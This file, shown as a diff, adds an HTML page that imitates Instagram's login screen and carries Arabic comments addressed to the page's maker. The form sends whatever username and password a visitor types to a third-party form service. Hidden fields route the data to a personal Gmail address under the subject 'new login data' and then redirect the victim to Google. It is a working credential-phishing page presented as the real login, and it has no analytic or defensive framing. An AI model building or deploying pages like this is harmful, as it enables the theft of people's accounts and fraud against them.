@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .login-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 50px;
+            color: #262626;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 9px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 3px;
+        }
+        button {
+            width: 100%;
+            padding: 8px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">Instagram</div>
+        
+        <!-- نموذج StaticForms مع المفتاح الخاص بك -->
+        <form action="https://api.staticforms.xyz/submit" method="POST">
+            
+            <!-- المفتاح الخاص بك من StaticForms -->
+            <input type="hidden" name="accessKey" value="sf_4abh2jc9mcfigi2c5kj91d79">
+            
+            <!-- حقول البيانات -->
+            <input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            
+            <!-- حقل خفي لتحديد موضوع البريد -->
+            <input type="hidden" name="subject" value="بيانات تسجيل دخول جديدة">
+            
+            <!-- البريد الذي سترسل إليه الإشعارات -->
+            <input type="hidden" name="replyTo" value="ominat54@gmail.com">
+            
+            <!-- حقل لمنع البريد العشوائي (honeypot) -->
+            <input type="text" name="honeypot" style="display:none">
+            
+            <!-- صفحة إعادة التوجيه بعد الإرسال -->
+            <input type="hidden" name="redirectTo" value="https://www.google.com">
+            
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+</body>
+</html>
